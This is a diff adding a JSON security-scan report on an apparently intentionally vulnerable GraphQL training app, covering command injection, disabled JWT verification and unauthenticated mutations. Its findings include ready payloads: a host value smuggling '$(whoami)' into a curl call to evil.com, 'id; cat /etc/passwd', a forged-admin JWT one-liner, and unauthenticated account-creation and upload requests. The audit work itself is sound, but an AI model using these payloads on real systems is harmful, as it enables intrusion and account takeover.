@@ -1,0 +1,1563 @@
+{
+  "agent_invocations": 18,
+  "attack_chains": [
+    {
+      "chain_id": "chain-001",
+      "combined_impact": "Attacker forges JWT token to impersonate admin, then retrieves all user passwords through resolve_password, enabling complete account takeover",
+      "combined_severity": "critical",
+      "description": "Attacker forges JWT token to impersonate admin, then retrieves all user passwords through resolve_password, enabling complete account takeover",
+      "findings": [
+        "auth-001",
+        "de-002",
+        "de-009",
+        "auth-016",
+        "sec-002",
+        "sec-001"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Full Account Takeover via JWT Forgery and Password Hash Theft"
+    },
+    {
+      "chain_id": "chain-002",
+      "combined_impact": "Multiple unauthenticated command injection points allow arbitrary OS command execution, leading to full server compromise",
+      "combined_severity": "critical",
+      "description": "Multiple unauthenticated command injection points allow arbitrary OS command execution, leading to full server compromise",
+      "findings": [
+        "inj-002",
+        "inj-004",
+        "inj-003",
+        "auth-009",
+        "auth-010",
+        "auth-008",
+        "auth-007"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Remote Code Execution via Multiple Command Injections"
+    },
+    {
+      "chain_id": "chain-003",
+      "combined_impact": "Unauthenticated users can create admin accounts, upload files, and delete all data without authorization",
+      "combined_severity": "critical",
+      "description": "Unauthenticated users can create admin accounts, upload files, and delete all data without authorization",
+      "findings": [
+        "auth-011",
+        "auth-005",
+        "auth-006",
+        "auth-012",
+        "auth-013",
+        "auth-004",
+        "auth-007"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Complete Data Destruction via Unauthorized Access"
+    },
+    {
+      "chain_id": "chain-004",
+      "combined_impact": "SSRF attack allows scanning internal networks, bypassing TLS verification exposes credentials to MITM attacks",
+      "combined_severity": "critical",
+      "description": "SSRF attack allows scanning internal networks, bypassing TLS verification exposes credentials to MITM attacks",
+      "findings": [
+        "api-004",
+        "auth-008",
+        "de-008"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Internal Network Compromise via SSRF"
+    },
+    {
+      "chain_id": "chain-005",
+      "combined_impact": "SQL injection enables database extraction, exposed audit logs reveal query patterns and sensitive data",
+      "combined_severity": "critical",
+      "description": "SQL injection enables database extraction, exposed audit logs reveal query patterns and sensitive data",
+      "findings": [
+        "api-005",
+        "auth-014",
+        "auth-015",
+        "de-007"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Database Compromise via SQL Injection"
+    },
+    {
+      "chain_id": "chain-006",
+      "combined_impact": "Unrestricted file upload combined with command execution allows web shell deployment and persistent access",
+      "combined_severity": "critical",
+      "description": "Unrestricted file upload combined with command execution allows web shell deployment and persistent access",
+      "findings": [
+        "auth-007",
+        "api-011",
+        "inj-004"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Web Shell Deployment via File Upload"
+    },
+    {
+      "chain_id": "chain-007",
+      "combined_impact": "Stack traces, debug info, and unfiltered audit logs expose internal structure, credentials, and query patterns for targeted attacks",
+      "combined_severity": "high",
+      "description": "Stack traces, debug info, and unfiltered audit logs expose internal structure, credentials, and query patterns for targeted attacks",
+      "findings": [
+        "de-001",
+        "de-004",
+        "auth-014",
+        "auth-015",
+        "de-007"
+      ],
+      "mitre_attack_mapping": null,
+      "title": "Information Disclosure Leading to Further Attacks"
+    }
+  ],
+  "branch": "main",
+  "by_severity": {
+    "critical": 9,
+    "high": 1,
+    "info": 0,
+    "low": 0,
+    "medium": 0
+  },
+  "commit_sha": "HEAD",
+  "compliance_gaps": [
+    {
+      "control_id": "§164.312(a)(1)",
+      "control_name": "Access control",
+      "cwe_ids": [
+        "CWE-306"
+      ],
+      "finding_count": 6,
+      "framework": "HIPAA",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "§164.312(a)(2)(iv)",
+      "control_name": "Encryption and decryption",
+      "cwe_ids": [
+        "CWE-312"
+      ],
+      "finding_count": 1,
+      "framework": "HIPAA",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "§164.312(c)(1)",
+      "control_name": "Integrity",
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "finding_count": 2,
+      "framework": "HIPAA",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "§164.312(d)",
+      "control_name": "Person or entity authentication",
+      "cwe_ids": [
+        "CWE-287"
+      ],
+      "finding_count": 1,
+      "framework": "HIPAA",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A.5.15",
+      "control_name": "Access control",
+      "cwe_ids": [
+        "CWE-306"
+      ],
+      "finding_count": 6,
+      "framework": "ISO27001",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A.5.17",
+      "control_name": "Authentication information",
+      "cwe_ids": [
+        "CWE-287"
+      ],
+      "finding_count": 1,
+      "framework": "ISO27001",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A.8.24",
+      "control_name": "Use of cryptography",
+      "cwe_ids": [
+        "CWE-312"
+      ],
+      "finding_count": 1,
+      "framework": "ISO27001",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A.8.28",
+      "control_name": "Secure coding",
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "finding_count": 2,
+      "framework": "ISO27001",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A02:2021",
+      "control_name": "Cryptographic Failures",
+      "cwe_ids": [
+        "CWE-312"
+      ],
+      "finding_count": 1,
+      "framework": "OWASP",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A03:2021",
+      "control_name": "Injection",
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "finding_count": 2,
+      "framework": "OWASP",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "A07:2021",
+      "control_name": "Identification and Authentication Failures",
+      "cwe_ids": [
+        "CWE-287",
+        "CWE-306"
+      ],
+      "finding_count": 7,
+      "framework": "OWASP",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "Req 3",
+      "control_name": "Protect stored account data",
+      "cwe_ids": [
+        "CWE-312"
+      ],
+      "finding_count": 1,
+      "framework": "PCI-DSS",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "Req 6.2.4",
+      "control_name": "Custom software addresses common coding vulnerabilities",
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "finding_count": 2,
+      "framework": "PCI-DSS",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "Req 8",
+      "control_name": "Identify users and authenticate access to system components",
+      "cwe_ids": [
+        "CWE-287",
+        "CWE-306"
+      ],
+      "finding_count": 7,
+      "framework": "PCI-DSS",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "CC6",
+      "control_name": "Logical and physical access controls",
+      "cwe_ids": [
+        "CWE-287",
+        "CWE-306",
+        "CWE-312"
+      ],
+      "finding_count": 8,
+      "framework": "SOC2",
+      "max_severity": "info"
+    },
+    {
+      "control_id": "CC7",
+      "control_name": "System operations",
+      "cwe_ids": [
+        "CWE-78"
+      ],
+      "finding_count": 2,
+      "framework": "SOC2",
+      "max_severity": "info"
+    }
+  ],
+  "confirmed": 10,
+  "cost_breakdown": {
+    "hunt": 0,
+    "prove": 0,
+    "recon": 0
+  },
+  "cost_usd": 0,
+  "depth_profile": "quick",
+  "duration_seconds": 4151.880822063016,
+  "findings": [
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 6.2.4",
+          "control_name": "Custom software addresses common coding vulnerabilities",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC7",
+          "control_name": "System operations",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A03:2021",
+          "control_name": "Injection",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(c)(1)",
+          "control_name": "Integrity",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.8.28",
+          "control_name": "Secure coding",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-78",
+      "cwe_name": "OS Command Injection",
+      "description": "The import_paste mutation accepts user-controlled host, port, path, and scheme parameters that are directly interpolated into a shell command executed via os.popen. The strip_dangerous_characters function only removes semicolons and ampersands, which is insufficient to prevent command injection.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "sast",
+      "fingerprint": "cwe-78-import-paste-command-injection",
+      "id": "cmd-injection-import-paste",
+      "location": {
+        "code_snippet": "def mutate(self, info, host='pastebin.com', port=443, path='/', scheme=\"http\"):\n    url = security.strip_dangerous_characters(f\"{scheme}://{host}:{port}{path}\")\n    cmd = helpers.run_cmd(f'curl --insecure {url}')",
+        "end_column": null,
+        "end_line": 211,
+        "file_path": "core/views.py",
+        "function_name": "ImportPaste.mutate",
+        "start_column": null,
+        "start_line": 209
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "GraphQL mutation accepts host, port, path, scheme as user-controlled arguments",
+            "file": "core/views.py",
+            "line": 204,
+            "tainted": true
+          },
+          {
+            "description": "User input interpolated into URL string",
+            "file": "core/views.py",
+            "line": 210,
+            "tainted": true
+          },
+          {
+            "description": "strip_dangerous_characters called with insufficient sanitization",
+            "file": "core/views.py",
+            "line": 210,
+            "tainted": true
+          },
+          {
+            "description": "os.popen executes command via shell with tainted input",
+            "file": "core/helpers.py",
+            "line": 9,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": "The command curl --insecure http://evil.com$(whoami):443/ would execute, with $(whoami) being evaluated by the shell to return the current user, demonstrating command injection.",
+        "exploit_hypothesis": "An attacker can inject arbitrary OS commands by providing malicious input in the host, path, or scheme parameters. By using command substitution syntax like $(whoami) or backticks, or pipe characters, the attacker can break out of the curl command and execute arbitrary commands on the server.",
+        "exploit_payload": "scheme=http&host=evil.com$(whoami)&port=443&path=/",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": "Use pipe (|), command substitution ($() or backticks), newlines, or unquoted spaces to inject commands. In easy mode (default), no sanitization exists. In hard mode, only ; and & are removed, leaving numerous bypass vectors.",
+          "bypass_possible": true,
+          "sanitization_found": true,
+          "sanitization_sufficient": false,
+          "sanitization_type": "character removal"
+        },
+        "verification_method": "Code analysis tracing user input from GraphQL mutation arguments through sanitization function to os.popen() shell execution. Confirmed that strip_dangerous_characters only removes semicolons and ampersands in hard mode, with no sanitization in easy mode (default). Multiple bypass vectors identified: |, $(), backticks, newlines, unquoted spaces.",
+        "vulnerable_code": "url = security.strip_dangerous_characters(f\"{scheme}://{host}:{port}{path}\")\ncmd = helpers.run_cmd(f'curl --insecure {url}')"
+      },
+      "rationale": "The vulnerability is confirmed exploitable. User-controlled input flows directly from GraphQL mutation parameters (host, port, path, scheme) through insufficient sanitization (strip_dangerous_characters only removes ; and & in hard mode, none in easy mode) to os.popen() which executes commands via shell. Multiple bypass vectors exist including pipe (|), command substitution ($()), backticks, and unquoted spaces. The vulnerable application is designed for security training, confirming intentional vulnerability.",
+      "related_locations": [
+        {
+          "code_snippet": "def run_cmd(cmd):\n  return os.popen(cmd).read()",
+          "end_column": null,
+          "end_line": 9,
+          "file_path": "core/helpers.py",
+          "function_name": "run_cmd",
+          "start_column": null,
+          "start_line": 8
+        },
+        {
+          "code_snippet": "def strip_dangerous_characters(cmd):\n  if helpers.is_level_easy():\n    return cmd\n  elif helpers.is_level_hard():\n    return cmd.replace(';','').replace('&', '')\n  return cmd",
+          "end_column": null,
+          "end_line": 46,
+          "file_path": "core/security.py",
+          "function_name": "strip_dangerous_characters",
+          "start_column": null,
+          "start_line": 41
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "mutation ImportPaste { import_paste(host: \"evil.com$(whoami)\", port: 443, path: \"/\", scheme: \"http\") { result } }",
+          "description": "Send GraphQL mutation with malicious host parameter containing command substitution",
+          "expected_output": null,
+          "step": 1
+        },
+        {
+          "command": null,
+          "description": "The server constructs: curl --insecure http://evil.com$(whoami):443/",
+          "expected_output": "The $(whoami) is evaluated by the shell, returning the current user (e.g., root) in the curl output",
+          "step": 2
+        },
+        {
+          "command": null,
+          "description": "Alternative payload using pipe: host: \"evil.com|whoami\"",
+          "expected_output": "In easy mode (default), command executes and returns both curl and whoami output",
+          "step": 3
+        }
+      ],
+      "sarif_rule_id": "sec-af/sast/cwe-78-os-command-injection",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "OS Command Injection in ImportPaste mutation",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 6.2.4",
+          "control_name": "Custom software addresses common coding vulnerabilities",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC7",
+          "control_name": "System operations",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A03:2021",
+          "control_name": "Injection",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(c)(1)",
+          "control_name": "Integrity",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.8.28",
+          "control_name": "Secure coding",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": {
+        "automatable": true,
+        "base_score": 9.3,
+        "severity": "critical",
+        "subsequent_impact": true,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "cwe_id": "CWE-78",
+      "cwe_name": "OS Command Injection",
+      "description": "The system_diagnostics GraphQL query accepts a cmd parameter that is passed to helpers.run_cmd(). While there is an allowed_cmds check in security.py, in 'easy' mode (default), this check returns True for all commands, allowing arbitrary command execution.",
+      "enables": null,
+      "epss": {
+        "date": "2026-03-05",
+        "percentile": 0.98,
+        "score": 0.95
+      },
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "sast",
+      "fingerprint": "cwe-78-system-diagnostics-cmd",
+      "id": "os-command-injection-system-diagnostics",
+      "location": {
+        "code_snippet": "if security.allowed_cmds(cmd):\n  output = helpers.run_cmd(cmd)",
+        "end_column": null,
+        "end_line": 345,
+        "file_path": "core/views.py",
+        "function_name": "resolve_system_diagnostics",
+        "start_column": null,
+        "start_line": 344
+      },
+      "owasp_category": "A1:2017-Injection",
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "GraphQL field definition accepts cmd parameter",
+            "file": "core/views.py",
+            "line": 273,
+            "tainted": true
+          },
+          {
+            "description": "resolve_system_diagnostics receives cmd from GraphQL query",
+            "file": "core/views.py",
+            "line": 337,
+            "tainted": true
+          },
+          {
+            "description": "allowed_cmds() returns True in easy mode (is_level_easy())",
+            "file": "core/security.py",
+            "line": 34,
+            "tainted": true
+          },
+          {
+            "description": "cmd passed to helpers.run_cmd()",
+            "file": "core/views.py",
+            "line": 345,
+            "tainted": true
+          },
+          {
+            "description": "os.popen(cmd).read() executes shell command",
+            "file": "core/helpers.py",
+            "line": 9,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": "Command output displayed in GraphQL response",
+        "exploit_hypothesis": "An attacker with valid admin credentials can inject arbitrary OS commands via the cmd parameter to the system_diagnostics GraphQL query. In easy mode (default), security.allowed_cmds() returns True for all commands, allowing complete bypass of intended command restrictions.",
+        "exploit_payload": "id; cat /etc/passwd",
+        "http_request": {
+          "body": "{\"query\": \"query { systemDiagnostics(username:\\\"admin\\\", password:\\\"changeme\\\", cmd:\\\"id\\\") }\"}",
+          "headers": null,
+          "highlighted_segment": null,
+          "method": "POST",
+          "url": "/graphql"
+        },
+        "http_response": null,
+        "poc_code": "query {\n  systemDiagnostics(username: \"admin\", password: \"changeme\", cmd: \"id; ls -la\")\n}",
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": "In easy mode (default), security.allowed_cmds() unconditionally returns True, bypassing any intended command restrictions. The sanitization only applies in hard mode.",
+          "bypass_possible": true,
+          "sanitization_found": true,
+          "sanitization_sufficient": false,
+          "sanitization_type": "whitelist-based (hard mode only)"
+        },
+        "verification_method": "Code analysis of source-to-sink data flow and review of security.allowed_cmds() implementation. Confirmed that in easy mode, allowed_cmds() returns True unconditionally, allowing any command to be passed to os.popen().",
+        "vulnerable_code": "if security.allowed_cmds(cmd):\n  output = helpers.run_cmd(cmd)"
+      },
+      "rationale": "Complete source-to-sink flow confirmed: GraphQL query parameter flows through resolve_system_diagnostics -> security.allowed_cmds() -> helpers.run_cmd() -> os.popen(). In easy mode (default), allowed_cmds returns True for ALL commands, bypassing any intended sanitization. Test case in tests/test_vulnerabilities.py:65 demonstrates exploit with cmd:'id'.",
+      "related_locations": [
+        {
+          "code_snippet": "def allowed_cmds(cmd):\n  if helpers.is_level_easy():\n    return True\n  elif helpers.is_level_hard():\n    if cmd.startswith(('echo', 'ps' 'whoami', 'tail')):\n      return True\n  return False",
+          "end_column": null,
+          "end_line": 39,
+          "file_path": "core/security.py",
+          "function_name": "allowed_cmds",
+          "start_column": null,
+          "start_line": 33
+        },
+        {
+          "code_snippet": "def run_cmd(cmd):\n  return os.popen(cmd).read()",
+          "end_column": null,
+          "end_line": 9,
+          "file_path": "core/helpers.py",
+          "function_name": "run_cmd",
+          "start_column": null,
+          "start_line": 8
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"query { systemDiagnostics(username:\\\"admin\\\", password:\\\"changeme\\\", cmd:\\\"id\\\") }\"}'",
+          "description": "Send GraphQL query to system_diagnostics with admin credentials and malicious cmd",
+          "expected_output": "Command output (e.g., uid=...) in JSON response",
+          "step": 1
+        }
+      ],
+      "sarif_rule_id": "sec-af/sast/os-command-injection",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [
+        "command-injection",
+        "graphql",
+        "os-command"
+      ],
+      "title": "OS Command Injection in system_diagnostics query",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(d)",
+          "control_name": "Person or entity authentication",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.17",
+          "control_name": "Authentication information",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-287",
+      "cwe_name": "Improper Authentication",
+      "description": "JWT token signature and expiration verification is disabled (verify_signature=False, verify_exp=False), allowing attackers to forge tokens, impersonate any user, and use expired tokens indefinitely. This is a critical authentication bypass vulnerability.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "config",
+      "fingerprint": "config_jwt_signature_disabled_core_helpers_21",
+      "id": "jwt-verify-disabled-core-helpers-21",
+      "location": {
+        "code_snippet": "def get_identity(token):\n  return decode(token, options={\"verify_signature\":False, \"verify_exp\":False}).get('identity')",
+        "end_column": null,
+        "end_line": 21,
+        "file_path": "core/helpers.py",
+        "function_name": "get_identity",
+        "start_column": null,
+        "start_line": 20
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "GraphQL 'me' field accepts token parameter from user input",
+            "file": "core/views.py",
+            "line": 281,
+            "tainted": true
+          },
+          {
+            "description": "Token passed to get_identity() function",
+            "file": "core/views.py",
+            "line": 286,
+            "tainted": true
+          },
+          {
+            "description": "JWT decoded without signature or expiration verification",
+            "file": "core/helpers.py",
+            "line": 21,
+            "tainted": true
+          },
+          {
+            "description": "Identity from JWT used to query database for user",
+            "file": "core/views.py",
+            "line": 295,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": "The GraphQL query returns the user object for the forged identity, enabling authentication bypass and user impersonation.",
+        "exploit_hypothesis": "An attacker can forge a JWT token with any identity claim (e.g., 'admin') and send it to the GraphQL 'me' query to impersonate that user and retrieve their data, without knowing the secret key or caring about token expiration.",
+        "exploit_payload": "mutation { me(token: \"{base64 encoded JWT with any identity claim}\") { id username email } }",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": "No sanitization exists. JWT verification is explicitly disabled.",
+          "bypass_possible": true,
+          "sanitization_found": false,
+          "sanitization_sufficient": false,
+          "sanitization_type": null
+        },
+        "verification_method": "Code analysis and data flow tracing: (1) GraphQL 'me' query accepts token parameter at core/views.py:281, (2) Token passed to get_identity() at line 286, (3) get_identity() decodes JWT without verification at core/helpers.py:21, (4) Identity used to query database for user data at lines 293-296.",
+        "vulnerable_code": null
+      },
+      "rationale": "The vulnerability is confirmed exploitable. The get_identity function at core/helpers.py:21 explicitly disables JWT signature and expiration verification with options={'verify_signature': False, 'verify_exp': False}. The token is passed directly from user input (GraphQL query parameter) and the extracted identity is used to query user data from the database without any additional validation. An attacker can forge a JWT with any identity claim (e.g., 'admin') and impersonate any user. The vulnerable code is reachable via the GraphQL 'me' query at core/views.py:281-296.",
+      "related_locations": [],
+      "reproduction_steps": [
+        {
+          "command": "python3 -c \"import jwt; print(jwt.encode({'identity': 'admin', 'type': 'access'}, '', algorithm='HS256'))\"",
+          "description": "Create a forged JWT token with any identity (e.g., 'admin'). Since verify_signature=False, any payload is accepted without signature validation.",
+          "expected_output": null,
+          "step": 1
+        },
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"{ me(token: \\\"<FORGED_TOKEN>\\\") { id username email } }\"}'",
+          "description": "Send GraphQL query with the forged token to retrieve user data",
+          "expected_output": null,
+          "step": 2
+        },
+        {
+          "command": null,
+          "description": "Observe that the response contains the admin user's data, confirming successful authentication bypass",
+          "expected_output": null,
+          "step": 3
+        }
+      ],
+      "sarif_rule_id": "sec-af/config/improper-authentication",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [],
+      "title": "JWT Signature and Expiration Verification Disabled",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The CreateUser GraphQL mutation allows any unauthenticated user to create new user accounts. No authentication check, JWT verification, or authorization is performed before creating user accounts.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "api-missing-auth-createuser-001",
+      "id": "api-missing-auth-createuser",
+      "location": {
+        "code_snippet": null,
+        "end_column": null,
+        "end_line": 107,
+        "file_path": "core/views.py",
+        "function_name": "CreateUser.mutate",
+        "start_column": null,
+        "start_line": 92
+      },
+      "owasp_category": "A7:2017 - Missing Function Level Access Control",
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": null,
+        "evidence_level": 6,
+        "expected_outcome": null,
+        "exploit_hypothesis": "An unauthenticated attacker can invoke the createUser GraphQL mutation to create arbitrary user accounts by sending a GraphQL request to /graphql without any Authorization header or JWT token.",
+        "exploit_payload": "mutation { createUser(userData: {username: \"attacker\", email: \"attacker@test.com\", password: \"password123\"}) { user { username email } } }",
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": null,
+        "verification_method": "Code inspection of core/views.py lines 92-107 and search for JWT/authentication decorators across the codebase confirmed no authentication is required for CreateUser mutation.",
+        "vulnerable_code": "class CreateUser(graphene.Mutation):\n  class Arguments:\n    user_data = UserInput(required=True)\n\n  user = graphene.Field(lambda:UserObject)\n\n  def mutate(root, info, user_data=None):\n    user_obj = User.create_user(\n      username=user_data.username,\n      email=user_data.email,\n      password=user_data.password\n    )\n    Audit.create_audit_entry(info)\n    return CreateUser(user=user_obj)"
+      },
+      "rationale": "Static analysis confirms no authentication decorators or middleware protect the CreateUser mutation. Code inspection shows the mutate() method directly accepts user_data from GraphQL input without any auth verification. The info parameter is not used to validate JWT tokens or check user identity. The mutation is exposed in the Mutations class without any protection.",
+      "related_locations": [
+        {
+          "code_snippet": "class Mutations(graphene.ObjectType):\n  create_paste = CreatePaste.Field()\n  edit_paste = EditPaste.Field()\n  delete_paste = DeletePaste.Field()\n  upload_paste = UploadPaste.Field()\n  import_paste = ImportPaste.Field()\n  create_user = CreateUser.Field()\n  login = Login.Field()",
+          "end_column": null,
+          "end_line": 250,
+          "file_path": "core/views.py",
+          "function_name": "Mutations",
+          "start_column": null,
+          "start_line": 243
+        }
+      ],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H \"Content-Type: application/json\" -d '{\"query\": \"mutation { createUser(userData: {username: \\\"attacker\\\", email: \\\"attacker@test.com\\\", password: \\\"password123\\\"}) { user { username email } } }\"}'",
+          "description": "Send a GraphQL mutation request to /graphql endpoint without any Authorization header",
+          "expected_output": "{\"data\": {\"createUser\": {\"user\": {\"username\": \"attacker\", \"email\": \"attacker@test.com\"}}}}",
+          "step": 1
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication-critical-function",
+      "sarif_security_severity": 5,
+      "severity": "critical",
+      "tags": [
+        "graphql",
+        "authentication",
+        "missing-auth",
+        "api"
+      ],
+      "title": "Missing Authentication for CreateUser Mutation",
+      "verdict": "confirmed"
+    },
+    {
+      "chain_id": null,
+      "chain_step": null,
+      "compliance": [
+        {
+          "control_id": "Req 8",
+          "control_name": "Identify users and authenticate access to system components",
+          "framework": "PCI-DSS"
+        },
+        {
+          "control_id": "CC6",
+          "control_name": "Logical and physical access controls",
+          "framework": "SOC2"
+        },
+        {
+          "control_id": "A07:2021",
+          "control_name": "Identification and Authentication Failures",
+          "framework": "OWASP"
+        },
+        {
+          "control_id": "§164.312(a)(1)",
+          "control_name": "Access control",
+          "framework": "HIPAA"
+        },
+        {
+          "control_id": "A.5.15",
+          "control_name": "Access control",
+          "framework": "ISO27001"
+        }
+      ],
+      "cvss_v4": null,
+      "cwe_id": "CWE-306",
+      "cwe_name": "Missing Authentication for Critical Function",
+      "description": "The UploadPaste GraphQL mutation allows unauthenticated file uploads to the server filesystem.",
+      "enables": null,
+      "epss": null,
+      "evidence_level": 6,
+      "exploitability_score": 5,
+      "finding_type": "api",
+      "fingerprint": "uploadpaste-missing-auth",
+      "id": "eadb1b2b-c4c9-47d7-a826-c54e43714ddb",
+      "location": {
+        "code_snippet": null,
+        "end_column": null,
+        "end_line": 198,
+        "file_path": "core/views.py",
+        "function_name": "UploadPaste.mutate",
+        "start_column": null,
+        "start_line": 185
+      },
+      "owasp_category": null,
+      "proof": {
+        "chain_steps": null,
+        "data_flow_evidence": null,
+        "data_flow_trace": [
+          {
+            "description": "UploadPaste.mutate accepts filename and content from GraphQL input without authentication check",
+            "file": "core/views.py",
+            "line": 185,
+            "tainted": true
+          },
+          {
+            "description": "save_file writes to WEB_UPLOADDIR + filename without path validation",
+            "file": "core/helpers.py",
+            "line": 25,
+            "tainted": true
+          }
+        ],
+        "evidence_level": 6,
+        "expected_outcome": null,
+        "exploit_hypothesis": "An unauthenticated attacker can invoke the upload_paste GraphQL mutation with arbitrary filename and content parameters to write files to the server filesystem. Combined with path traversal in the filename parameter, the attacker can write to any location writable by the application user.",
+        "exploit_payload": null,
+        "http_request": null,
+        "http_response": null,
+        "poc_code": null,
+        "poc_execution_output": null,
+        "reachability": null,
+        "sanitization_analysis": {
+          "bypass_method": null,
+          "bypass_possible": true,
+          "sanitization_found": false,
+          "sanitization_sufficient": false,
+          "sanitization_type": null
+        },
+        "verification_method": "Code analysis of core/views.py UploadPaste mutation, core/helpers.py save_file function, and verification that no authentication checks exist on the mutation. Analysis of GraphQL schema setup confirms no global authentication enforcement.",
+        "vulnerable_code": "def mutate(self, info, filename, content):\n    result = helpers.save_file(filename, content)"
+      },
+      "rationale": "The UploadPaste mutation at core/views.py:185 can be invoked without any authentication token. The mutate method directly calls helpers.save_file() with user-controlled filename and content parameters. No authentication decorator, middleware, or token check is present. The save_file function (core/helpers.py:23-30) writes content directly to WEB_UPLOADDIR + filename without path traversal validation. An attacker can write arbitrary files to the server filesystem including potentially overwriting existing files or creating new ones.",
+      "related_locations": [],
+      "reproduction_steps": [
+        {
+          "command": "curl -X POST http://localhost:5000/graphql -H 'Content-Type: application/json' -d '{\"query\": \"mutation { upload_paste(filename: \\\"test.txt\\\", content: \\\"malicious content\\\") { result } }\"}'",
+          "description": "Send GraphQL mutation request without any authentication token",
+          "expected_output": null,
+          "step": 1
+        },
+        {
+          "command": "ls -la pastes/test.txt",
+          "description": "Verify file was created in the pastes directory",
+          "expected_output": null,
+          "step": 2
+        }
+      ],
+      "sarif_rule_id": "sec-af/api/missing-authentication-critical-function",
+      "sarif_security_severity": 5,
